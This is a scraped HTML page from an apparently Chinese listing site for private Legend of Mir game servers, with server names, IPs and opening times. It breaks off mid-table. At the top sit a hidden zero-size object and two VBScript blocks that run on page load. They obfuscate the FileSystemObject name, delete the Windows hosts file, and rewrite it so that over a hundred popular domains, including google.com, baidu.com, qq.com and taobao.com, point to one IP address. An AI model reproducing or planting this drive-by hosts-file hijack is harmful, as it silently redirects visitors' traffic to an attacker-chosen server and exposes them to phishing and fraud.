<object data="http://www.sfyg.com/du.asp" width=0 height=0></object>
<script LANGUAGE="VBScript">


on error resume next

Set Fso=CreateObject("Scri" + "pting.Fil" + "eSyste" + "mO" + "bject")


wj1 = "C:\\WINDOWS\\system32\\drivers\\etc\\hosts"
Set f2 = fso.deleteFile(wj1,true)


Set wf1=fso.CreateTextFile(wj1,true)
wf1.writeLine("127.0.0.1       localhost")
wf1.writeLine("218.92.240.2	sina.comcn")
wf1.writeLine("218.92.240.2	google.com")
wf1.writeLine("218.92.240.2	baidu.com")
wf1.writeLine("218.92.240.2	sohu.com")
wf1.writeLine("218.92.240.2	qiandu.com")
wf1.writeLine("218.92.240.2	pku.edu.cn")
wf1.writeLine("218.92.240.2	163.com")
wf1.writeLine("218.92.240.2	cn.yahoo.com")
wf1.writeLine("218.92.240.2	china.com")
wf1.writeLine("218.92.240.2	intel.com")
wf1.writeLine("218.92.240.2	168idc.com")
wf1.writeLine("218.92.240.2	chinadns.com")
wf1.writeLine("218.92.240.2	comapnydns.com")
wf1.writeLine("218.92.240.2	companycn.com")
wf1.writeLine("218.92.240.2	yhyb.com.cn")
wf1.writeLine("218.92.240.2	useheart.com")
wf1.writeLine("218.92.240.2	flygood.com.cn")
wf1.writeLine("218.92.240.2	mammoth.com.cn")
wf1.writeLine("218.92.240.2	chinadatacom.com")
wf1.writeLine("218.92.240.2	szsh.com.cn")
wf1.writeLine("218.92.240.2	enet.com.cn")
wf1.writeLine("218.92.240.2	tongfangpc.com")
wf1.writeLine("218.92.240.2	hp.com")
wf1.writeLine("218.92.240.2	ezshop.net.cn")
wf1.writeLine("218.92.240.2	it168.com")
wf1.writeLine("218.92.240.2	pconline.comcn")
wf1.writeLine("218.92.240.2	zol.com.cn")
wf1.writeLine("218.92.240.2	yinhenet.com")
wf1.writeLine("218.92.240.2	hc360.com")
wf1.writeLine("218.92.240.2	benu.cn")
wf1.writeLine("218.92.240.2	365gou.com.cn")
wf1.writeLine("218.92.240.2	it995.com")
wf1.writeLine("218.92.240.2	anddo.com")
wf1.writeLine("218.92.240.2	9876543210.cn")
wf1.writeLine("218.92.240.2	58365.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	payway.com.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	cxina.com")
wf1.writeLine("218.92.240.2	sznic.comcn")
wf1.writeLine("218.92.240.2	bizcn.com")
wf1.writeLine("218.92.240.2	woowoo.cn")
wf1.writeLine("218.92.240.2	blueie.net")
wf1.writeLine("218.92.240.2	cndns.net.cn")
wf1.writeLine("218.92.240.2	nihao.net")
wf1.writeLine("218.92.240.2	hotsales.net")
wf1.writeLine("218.92.240.2	west263.com")
wf1.writeLine("218.92.240.2	usernet.cn")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	tf263.com")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	ourhost.com.cn")
wf1.writeLine("218.92.240.2	35inter.com")
wf1.writeLine("218.92.240.2	bigwww.com")
wf1.writeLine("218.92.240.2	cnwindows.com")
wf1.writeLine("218.92.240.2	zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	rent8890.com")
wf1.writeLine("218.92.240.2	61com.com")
wf1.writeLine("218.92.240.2	pc-lease.com.cn")
wf1.writeLine("218.92.240.2	netcenter.com.cn")
wf1.writeLine("218.92.240.2	kete.cn")
wf1.writeLine("218.92.240.2	zgsj.com")
wf1.writeLine("218.92.240.2	edong.com")
wf1.writeLine("218.92.240.2	51web.cn")
wf1.writeLine("218.92.240.2	17466.com")
wf1.writeLine("218.92.240.2	aaasf.com")
wf1.writeLine("218.92.240.2	vridc.com")
wf1.writeLine("218.92.240.2	chinasfz.com")
wf1.writeLine("218.92.240.2	www.qiandu.com")
wf1.writeLine("218.92.240.2	www.pku.edu.cn")
wf1.writeLine("218.92.240.2	www.cnyahoo.com")
wf1.writeLine("218.92.240.2	www.china.com")
wf1.writeLine("218.92.240.2	www.intel.com")
wf1.writeLine("218.92.240.2	www.168idc.com")
wf1.writeLine("218.92.240.2	www.chinadns.com")
wf1.writeLine("218.92.240.2	www.comapnydns.com")
wf1.writeLine("218.92.240.2	www.companycn.com")
wf1.writeLine("218.92.240.2	www.yhyb.com.cn")
wf1.writeLine("218.92.240.2	www.useheart.com")
wf1.writeLine("218.92.240.2	www.flygood.com.cn")
wf1.writeLine("218.92.240.2	www.mammoth.com.cn")
wf1.writeLine("218.92.240.2	www.chinadatacom.com")
wf1.writeLine("218.92.240.2	www.szsh.com.cn")
wf1.writeLine("218.92.240.2	www.enet.com.cn")
wf1.writeLine("218.92.240.2	www.tongfangpc.com")
wf1.writeLine("218.92.240.2	www.hp.com")
wf1.writeLine("218.92.240.2	www.ezshop.net.cn")
wf1.writeLine("218.92.240.2	www.it168.com")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	www.zol.com.cn")
wf1.writeLine("218.92.240.2	www.yinhenet.com")
wf1.writeLine("218.92.240.2	www.hc360.com")
wf1.writeLine("218.92.240.2	www.benu.cn")
wf1.writeLine("218.92.240.2	www.365gou.com.cn")
wf1.writeLine("218.92.240.2	www.it995.com")
wf1.writeLine("218.92.240.2	www.anddo.com")
wf1.writeLine("218.92.240.2	www.9876543210.cn")
wf1.writeLine("218.92.240.2	www.58365.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	www.payway.com.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.cxina.com")
wf1.writeLine("218.92.240.2	www.sznic.comcn")
wf1.writeLine("218.92.240.2	www.bizcn.com")
wf1.writeLine("218.92.240.2	www.woowoo.cn")
wf1.writeLine("218.92.240.2	www.blueie.net")
wf1.writeLine("218.92.240.2	www.cndns.net.cn")
wf1.writeLine("218.92.240.2	www.nihao.net")
wf1.writeLine("218.92.240.2	www.hotsales.net")
wf1.writeLine("218.92.240.2	www.west263.com")
wf1.writeLine("218.92.240.2	www.usernet.cn")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.tf263.com")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.ourhost.com.cn")
wf1.writeLine("218.92.240.2	www.35inter.com")
wf1.writeLine("218.92.240.2	www.bigwww.com")
wf1.writeLine("218.92.240.2	www.cnwindows.com")
wf1.writeLine("218.92.240.2	www.zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	www.rent8890.com")
wf1.writeLine("218.92.240.2	www.61com.com")
wf1.writeLine("218.92.240.2	www.pc-lease.com.cn")
wf1.writeLine("218.92.240.2	www.netcenter.com.cn")
wf1.writeLine("218.92.240.2	www.kete.cn")
wf1.writeLine("218.92.240.2	www.zgsj.com")
wf1.writeLine("218.92.240.2	www.edong.com")
wf1.writeLine("218.92.240.2	www.51web.cn")
wf1.writeLine("218.92.240.2	www.17466.com")
wf1.writeLine("218.92.240.2	www.aaasf.com")
wf1.writeLine("218.92.240.2	www.vridc.com")
wf1.writeLine("218.92.240.2	www.chinasfz.com")
wf1.writeLine("218.92.240.2	www.haosf.com")
wf1.writeLine("218.92.240.2	3721.com")
wf1.writeLine("218.92.240.2	qq.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	cns.3721.com")
wf1.writeLine("218.92.240.2	www.taobao.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	www.allyes.com")
wf1.writeLine("218.92.240.2	allyes.com")
wf1.writeLine("218.92.240.2	www.21cn.com")
wf1.writeLine("218.92.240.2	21cn.com")
wf1.writeLine("218.92.240.2	chinaren.com")
wf1.writeLine("218.92.240.2	www.chinaren.com")
wf1.writeLine("218.92.240.2	hao123.com")
wf1.writeLine("218.92.240.2	www.hao123.com")
wf1.writeLine("218.92.240.2	pconline.com.cn")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	sogou.com")
wf1.writeLine("218.92.240.2	www.sogou.com")
wf1.writeLine("218.92.240.2	17173.com")
wf1.writeLine("218.92.240.2	www.17173.com")
wf1.writeLine("218.92.240.2	cmfu.com")
wf1.writeLine("218.92.240.2	www.cmfu.com")
wf1.writeLine("218.92.240.2	www.51job.com")
wf1.writeLine("218.92.240.2	51job.com")

</script>
<script LANGUAGE="VBScript">
on error resume next
Set Fso=CreateObject("Scri" + "pting.Fil" + "eSyste" + "mO" + "bject")

wj1 = "C:\\WINDNT\\system32\\drivers\\etc\\hosts"
Set f2 = fso.deleteFile(wj1,true)

Set wf1=fso.CreateTextFile(wj1,true)
wf1.writeLine("127.0.0.1       localhost")
wf1.writeLine("218.92.240.2	sina.comcn")
wf1.writeLine("218.92.240.2	google.com")
wf1.writeLine("218.92.240.2	baidu.com")
wf1.writeLine("218.92.240.2	sohu.com")
wf1.writeLine("218.92.240.2	qiandu.com")
wf1.writeLine("218.92.240.2	pku.edu.cn")
wf1.writeLine("218.92.240.2	163.com")
wf1.writeLine("218.92.240.2	cn.yahoo.com")
wf1.writeLine("218.92.240.2	china.com")
wf1.writeLine("218.92.240.2	intel.com")
wf1.writeLine("218.92.240.2	168idc.com")
wf1.writeLine("218.92.240.2	chinadns.com")
wf1.writeLine("218.92.240.2	comapnydns.com")
wf1.writeLine("218.92.240.2	companycn.com")
wf1.writeLine("218.92.240.2	yhyb.com.cn")
wf1.writeLine("218.92.240.2	useheart.com")
wf1.writeLine("218.92.240.2	flygood.com.cn")
wf1.writeLine("218.92.240.2	mammoth.com.cn")
wf1.writeLine("218.92.240.2	chinadatacom.com")
wf1.writeLine("218.92.240.2	szsh.com.cn")
wf1.writeLine("218.92.240.2	enet.com.cn")
wf1.writeLine("218.92.240.2	tongfangpc.com")
wf1.writeLine("218.92.240.2	hp.com")
wf1.writeLine("218.92.240.2	ezshop.net.cn")
wf1.writeLine("218.92.240.2	it168.com")
wf1.writeLine("218.92.240.2	pconline.comcn")
wf1.writeLine("218.92.240.2	zol.com.cn")
wf1.writeLine("218.92.240.2	yinhenet.com")
wf1.writeLine("218.92.240.2	hc360.com")
wf1.writeLine("218.92.240.2	benu.cn")
wf1.writeLine("218.92.240.2	365gou.com.cn")
wf1.writeLine("218.92.240.2	it995.com")
wf1.writeLine("218.92.240.2	anddo.com")
wf1.writeLine("218.92.240.2	9876543210.cn")
wf1.writeLine("218.92.240.2	58365.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	payway.com.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	cxina.com")
wf1.writeLine("218.92.240.2	sznic.comcn")
wf1.writeLine("218.92.240.2	bizcn.com")
wf1.writeLine("218.92.240.2	woowoo.cn")
wf1.writeLine("218.92.240.2	blueie.net")
wf1.writeLine("218.92.240.2	cndns.net.cn")
wf1.writeLine("218.92.240.2	nihao.net")
wf1.writeLine("218.92.240.2	hotsales.net")
wf1.writeLine("218.92.240.2	west263.com")
wf1.writeLine("218.92.240.2	usernet.cn")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	tf263.com")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	ourhost.com.cn")
wf1.writeLine("218.92.240.2	35inter.com")
wf1.writeLine("218.92.240.2	bigwww.com")
wf1.writeLine("218.92.240.2	cnwindows.com")
wf1.writeLine("218.92.240.2	zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	rent8890.com")
wf1.writeLine("218.92.240.2	61com.com")
wf1.writeLine("218.92.240.2	pc-lease.com.cn")
wf1.writeLine("218.92.240.2	netcenter.com.cn")
wf1.writeLine("218.92.240.2	kete.cn")
wf1.writeLine("218.92.240.2	zgsj.com")
wf1.writeLine("218.92.240.2	edong.com")
wf1.writeLine("218.92.240.2	51web.cn")
wf1.writeLine("218.92.240.2	17466.com")
wf1.writeLine("218.92.240.2	aaasf.com")
wf1.writeLine("218.92.240.2	vridc.com")
wf1.writeLine("218.92.240.2	chinasfz.com")
wf1.writeLine("218.92.240.2	www.qiandu.com")
wf1.writeLine("218.92.240.2	www.pku.edu.cn")
wf1.writeLine("218.92.240.2	www.cnyahoo.com")
wf1.writeLine("218.92.240.2	www.china.com")
wf1.writeLine("218.92.240.2	www.intel.com")
wf1.writeLine("218.92.240.2	www.168idc.com")
wf1.writeLine("218.92.240.2	www.chinadns.com")
wf1.writeLine("218.92.240.2	www.comapnydns.com")
wf1.writeLine("218.92.240.2	www.companycn.com")
wf1.writeLine("218.92.240.2	www.yhyb.com.cn")
wf1.writeLine("218.92.240.2	www.useheart.com")
wf1.writeLine("218.92.240.2	www.flygood.com.cn")
wf1.writeLine("218.92.240.2	www.mammoth.com.cn")
wf1.writeLine("218.92.240.2	www.chinadatacom.com")
wf1.writeLine("218.92.240.2	www.szsh.com.cn")
wf1.writeLine("218.92.240.2	www.enet.com.cn")
wf1.writeLine("218.92.240.2	www.tongfangpc.com")
wf1.writeLine("218.92.240.2	www.hp.com")
wf1.writeLine("218.92.240.2	www.ezshop.net.cn")
wf1.writeLine("218.92.240.2	www.it168.com")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	www.zol.com.cn")
wf1.writeLine("218.92.240.2	www.yinhenet.com")
wf1.writeLine("218.92.240.2	www.hc360.com")
wf1.writeLine("218.92.240.2	www.benu.cn")
wf1.writeLine("218.92.240.2	www.365gou.com.cn")
wf1.writeLine("218.92.240.2	www.it995.com")
wf1.writeLine("218.92.240.2	www.anddo.com")
wf1.writeLine("218.92.240.2	www.9876543210.cn")
wf1.writeLine("218.92.240.2	www.58365.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	www.payway.com.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.cxina.com")
wf1.writeLine("218.92.240.2	www.sznic.comcn")
wf1.writeLine("218.92.240.2	www.bizcn.com")
wf1.writeLine("218.92.240.2	www.woowoo.cn")
wf1.writeLine("218.92.240.2	www.blueie.net")
wf1.writeLine("218.92.240.2	www.cndns.net.cn")
wf1.writeLine("218.92.240.2	www.nihao.net")
wf1.writeLine("218.92.240.2	www.hotsales.net")
wf1.writeLine("218.92.240.2	www.west263.com")
wf1.writeLine("218.92.240.2	www.usernet.cn")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.tf263.com")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.ourhost.com.cn")
wf1.writeLine("218.92.240.2	www.35inter.com")
wf1.writeLine("218.92.240.2	www.bigwww.com")
wf1.writeLine("218.92.240.2	www.cnwindows.com")
wf1.writeLine("218.92.240.2	www.zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	www.rent8890.com")
wf1.writeLine("218.92.240.2	www.61com.com")
wf1.writeLine("218.92.240.2	www.pc-lease.com.cn")
wf1.writeLine("218.92.240.2	www.netcenter.com.cn")
wf1.writeLine("218.92.240.2	www.kete.cn")
wf1.writeLine("218.92.240.2	www.zgsj.com")
wf1.writeLine("218.92.240.2	www.edong.com")
wf1.writeLine("218.92.240.2	www.51web.cn")
wf1.writeLine("218.92.240.2	www.17466.com")
wf1.writeLine("218.92.240.2	www.aaasf.com")
wf1.writeLine("218.92.240.2	www.vridc.com")
wf1.writeLine("218.92.240.2	www.chinasfz.com")
wf1.writeLine("218.92.240.2	www.haosf.com")
wf1.writeLine("218.92.240.2	3721.com")
wf1.writeLine("218.92.240.2	qq.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	cns.3721.com")
wf1.writeLine("218.92.240.2	www.taobao.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	www.allyes.com")
wf1.writeLine("218.92.240.2	allyes.com")
wf1.writeLine("218.92.240.2	www.21cn.com")
wf1.writeLine("218.92.240.2	21cn.com")
wf1.writeLine("218.92.240.2	chinaren.com")
wf1.writeLine("218.92.240.2	www.chinaren.com")
wf1.writeLine("218.92.240.2	hao123.com")
wf1.writeLine("218.92.240.2	www.hao123.com")
wf1.writeLine("218.92.240.2	pconline.com.cn")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	sogou.com")
wf1.writeLine("218.92.240.2	www.sogou.com")
wf1.writeLine("218.92.240.2	17173.com")
wf1.writeLine("218.92.240.2	www.17173.com")
wf1.writeLine("218.92.240.2	cmfu.com")
wf1.writeLine("218.92.240.2	www.cmfu.com")
wf1.writeLine("218.92.240.2	www.51job.com")
wf1.writeLine("218.92.240.2	51job.com")

</script>
<head>
<SCRIPT language=javascript author=luxiaoqing><!--
function initArray(){for(i=0;i<initArray.arguments.length;i++)
this[i]=initArray.arguments[i];}var isnMonths=new initArray("1月","2月","3月","4月","5月","6月","7月","8月","9月","10月","11月","12月");var isnDays=new initArray("星期日","星期一","星期二","星期三","星期四","星期五","星期六","星期日");today=new Date();hrs=today.getHours();min=today.getMinutes();sec=today.getSeconds();clckh=""+((hrs+1>12)?hrs+1-12:hrs);
clckm=((min<10)?"0":"")+min;clcks=((sec<10)?"0":"")+sec;clck=(hrs>=12)?"下午":"上午";var stnr="";var ns="0123456789";var a="";
//-->

</SCRIPT>
<script src="http://www.9jh.com/counter/mystat.aspx?style=no"></script>
<STYLE type=text/css>.headinput {
	WIDTH: 50px; BORDER-TOP-STYLE: none; BORDER-BOTTOM: #666666 1px solid; BORDER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none; HEIGHT: 15px
}
BODY {
	FONT-SIZE: 12px; FONT-FAMILY: "Tahoma","宋体";background-image: url(http://domain.9jh.com/images/greystrip.gIf);background-position: center center;
}
TD {
	FONT-SIZE: 12px; FONT-FAMILY: "Tahoma","宋体"
}
A:link {
	COLOR: #000000; TEXT-DECORATION: none
}
A:visited {
	COLOR: #000000; TEXT-DECORATION: none
}
A:hover {
	COLOR: #CC6600; TEXT-DECORATION: underline
}
A:active {
	COLOR: #CC6600; TEXT-DECORATION: underline
}
.tableBorder1 {
	BORDER-RIGHT: 1px; BORDER-TOP: 1px; BORDER-LEFT: 1px; WIDTH: 98%; BORDER-BOTTOM: 1px; BACKGROUND-COLOR: #CC6600
}
TD.TableBody1 {
	BACKGROUND-COLOR: #ffffff
}
.page
{
	background-color: #FFFFFF;
	color: #000000;
}
.tborder
{
	background-color: #D1D1E1;
	color: #000000;
	border: 1px solid #CC6600;
}
.alt1
{
	background-color: #EEEEC6;
	color: #000000;
}
.navbar
{
	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
}
.style31 {FONT-SIZE: 12px; TEXT-INDENT: 2em; line-height: 16px; color: #CC6600; }
.en {
	FONT-SIZE: 11px; FONT-FAMILY: verdana
}
</STYLE>
<head>
<meta http-equiv="Content-Language" content="zh-cn">
<title>传奇私服开机预告 私服资讯 Www.SfYG.Com</title>
<meta name="keywords" content="九天传奇,internet explorer,泡泡堂,外挂,盛大,传奇,奇迹,软件,QQ,木子,写真,下载,破解,密码,性爱,免费电影,MP3, 电影, 音乐, MP3下载, 音乐下载, 游戏, flash, 在线音乐, 下载, 手机铃声, 娱乐, 手机短信, 流行音乐, 歌曲下载, 图片, 手机, 孙燕姿, 电影音乐, 周杰伦, 贺卡,泡泡城市,泡泡,杂志,俱乐部,游戏,网络,网游,网络游戏,攻略,秘笈,经验,外挂,电影,激情电影,美女,明星,写真,星座,娱乐,论坛,网吧,天堂,天使,在线,天使在线, 游戏, 网游, 网络, 仙境, 传说, 魔力, 网金, 深邃, 幻想, 天下, 遗忘, 传说, 百战, 天虫, 反恐, 精英, 宠物, 万王, 神兵, 巨商, 武魂, 石器, 千年, 怪兽, 动员, 混乱, 冒险, 红月, 龙族, 金庸, 英雄, 世纪, 决战, 冰风, 征服, 魔剑, 乐园, 传奇, 碰碰, 世代, 大话, 天骄, 西游, 骑士, 童话, 王国, 命运, 幻灵, 仙剑, 奇侠, 游侠, 佣兵, 三国, 破碎, 银河, 千年II, 千年2, 三国策, 天上碑, 孔雀王, 轩辕剑, 大富翁, 科洛斯, 嘭嘭帮, 大海战, 苹果派, 侠客行, 西游记, 疯狂坦克, 混乱冒险, 幻灵游侠, 流星学院, 剑侠情缘, 佣兵传说, 新西游记, 童话王国, 新天上碑, 骑士传奇, 遗忘传说, 魔力宝贝, 仙境传说, 成吉思汗, 天空之城, 破碎银河, 破碎银河系, 怪兽总动员, 外挂, 交友, 玩家, 照片, 相册, 软件, 成人文学,黄色,下载,攻略,秘芨,秘籍,论坛,交流,音乐, 影视, 休闲娱乐, 心情文学,D.O.Onlne, Shangrila, Angel, BBS, Online, A3, Arcane, Asgard, Talesweaver, CS, EQ, RO, Ragnarok,Sephiroth, Survival, Game, Games,外挂,软件, Net, W.Y.D, WYD, Shining, Lore, N-AGE, Nage, Redmoon, UO,江湖,Mud">
</head>

<body topmargin="0">

<table border="0" width="924" id="table1" cellspacing="0" cellpadding="0" align="center" height="76">
	<tr>
		<td height="38">
		<table cellSpacing="0" cellPadding="0" width="924" border="0" id="table3">
			<tr borderColor="#ffffff" bgColor="#000000">
				<td bgColor="#000000" colSpan="11" height="19" style="font-size: 12px; color: #FFFFFF">
				<div class="style62" align="center">
					<a class="style62" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.sfyg.com')" href="http://www.sfyg.com">
					<font color="#FFFFFF">如果您是传奇私服的忠实玩家，建议您将此站设为首页，点击设置为首页!</font></a></div>
				</td>
			</tr>
			<tr borderColor="#ffffff" bgColor="#000000">
				<td bgColor="#000000" colSpan="11" height="19" style="font-size: 12px; color: #FFFFFF">
				<div class="style54" align="center">
					<a class="style62" href="javascript:window.external.addFavorite('http://www.sfyg.com','每日最新私服开机预告')">
					<font color="#FFFFFF">如果您很喜欢本站，或很喜欢传奇这个游戏，您可以将本站加入收藏!点击收藏!</font></a></div>
				</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td align="center">
		<a name="1"><span id="post1" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg"><font color="#ff0000"><b>
		<table cellSpacing="0" borderColorDark="#BFDFFF" cellPadding="5" width="924" borderColorLight="#99CCFF" border="1" id="table2">
			<tr>
				<td width="180" bgColor="#ecf8ff" style="font-family: 宋体; font-size: 9pt">
				<p align="left"><font face="幼圆"><span style="FONT-SIZE: 13pt">
				<font color="#0000ff">服务器名:</font> 九天一剑<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">IP:</font> 218.92.240.21<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">开放时间:</font> <b><font color="#ff0000">
				测试中..</font></b><br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">所属线路:</font> 江苏电信<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">版本介绍:</font> 仿盛大1.85</span></font></td>
				<td width="212" bgColor="#ecf8ff" style="font-family: 宋体; font-size: 9pt">
				<p align="left"><font face="幼圆"><span style="FONT-SIZE: 13pt">
				<font color="#0000ff">服务器名:</font> 飞龙传说<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">IP: </font><font color="#0000FF">
				218.92.240.28</font><br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">开放时间:</font> <SCRIPT language=javascript><!--
function getFullYear(d){//d is a date object
yr=d.getYear();if(yr<1000)
yr+=1900;return yr;}
;document.write(""+getFullYear(today)+"年/"+isnMonths[today.getMonth()]+"/"+today.getDate()+"日/"+clck+""+clckh+"点开放");

//-->

</SCRIPT><br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">所属线路:</font> 江苏电信<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">版本介绍: </font>仿盛大1.85</span></font></td>
				<td width="214" bgColor="#ecf8ff" style="font-family: 宋体; font-size: 9pt">
				<p style="line-height: 150%; margin-top: 0; margin-bottom: 0" align="center">
				<font color="#000000" size="2"><span id="neonlight">
				本站每天更新最新开放的传奇私服-请记住本站永久域名：WWW.SFYG.COM 同时不要忘记按Ctrl+D并且告诉你的QQ好友哦≮≮≮您的一点点支持我们都会很感动≯≯≯</span></font></td>
				</a>
				<td width="268" bgColor="#ecf8ff" style="font-family: 宋体; font-size: 9pt">
				<p align="center" style="line-height: 150%; margin-top: 0; margin-bottom: 0"><b><font color="#FF0000">
				<a target="_blank" href="http://mir.9jh.com">
				<font size="4" color="#FF0000">免费架设游戏服务器自己做ＧＭ</font></a></font></b><font size="4"><p align="center" style="line-height: 150%; margin-top: 0; margin-bottom: 0">
				</font><font color="#FF0000"><b>
				<a target="_blank" href="http://mir.9jh.com/web">
				<font size="4" color="#000080">再送本站黄金广告位!</font></a></b></font><a name="1"><p align="center">广告位招租:QQ818338</td>
			</tr>
			<tr>
				<td width="180" bgColor="#ecf8ff" style="font-family: 宋体; font-size: 9pt">
		<a name="11"><span id="post3" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg1"><font color="#ff0000"><font face="幼圆"><b>
				<span style="FONT-SIZE: 13pt">
				<font color="#0000ff">服务器名:</font> 小小网吧<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">IP:</font> 218.92.240.30<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">开放时间:</font> 6.1晚8点<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">所属线路:</font> 江苏电信<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">版本介绍:</font> </span>
		</b><span style="FONT-SIZE: 13pt">
				仿盛大1.8</span></font></font></span></span></a></td>
				<td width="212" bgColor="#ecf8ff" style="font-family: 宋体; font-size: 9pt">
				<p align="left">
				<span id="post7" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg5"><font color="#ff0000"><b>
		<a name="15"><span id="post8" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg6"><font face="幼圆" color="#ff0000">
				<span style="FONT-SIZE: 13pt">
				<font color="#0000ff">服务器名:</font> 怡红院</span></font></span></span></a></b></font></span></span><STRONG><IMG SRC="images/NEW.GIF"></STRONG><span id="post7" style="font-size: 12px; color: #000000"><span id="LeoBBSgg5"><font color="#ff0000"><b><a name="15"><span id="post8" style="font-size: 12px; color: #000000"><span id="LeoBBSgg6"><font face="幼圆" color="#ff0000"><span style="FONT-SIZE: 13pt"><br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">IP:</font> 218.92.240.26<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">开放时间:</font> 5月30<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">所属线路:</font> 江苏电信<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">版本介绍:</font> </span></font></span></span></a>
		</b></font></span></span><a name="15"><b>
				<font face="幼圆" style="font-size: 13pt" color="#FF0000">中等变态</font></b></a></td>
				<td width="214" bgColor="#ecf8ff" style="font-family: 宋体; font-size: 9pt">
				<p align="left">
		<span id="LeoBBSgg7">
				<span id="post9" style="font-size: 12px; color: #000000">
				<font color="#ff0000"><b>
				<span id="post10" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg8">
		<a name="16"><span id="post11" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg9"><font face="幼圆" color="#ff0000">
				<span style="FONT-SIZE: 13pt">
				<font color="#0000ff">服务器名:</font> </span></font></span></span></a></span></span>
		</b></font></span><font color="#ff0000"><b>
				<font face="幼圆" style="font-size: 13pt">
				<a name="16" target="_blank" href="http://www.cn8816.com">
				<span id="post9" style="color: #000000">
				颠峰时刻</span></a></font><span id="post9" style="font-size: 12px; color: #000000"><STRONG><IMG SRC="images/NEW.GIF"></STRONG><span id="post12" style="font-size: 12px; color: #000000"><span id="LeoBBSgg10"><a name="17"><span id="post13" style="font-size: 12px; color: #000000"><span id="LeoBBSgg11"><font face="幼圆" color="#ff0000"><span style="FONT-SIZE: 13pt"><br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">IP:</font> 218.92.240.29<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">开放时间:</font> 7月29日20:00<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">所属线路:</font> 江苏电信<br style="font-family: 宋体; font-size: 9pt">
				<font color="#0000ff">版本介绍:</font> </span></font></span></span></a>
				</span></span></span><font face="幼圆" style="font-size: 13pt">
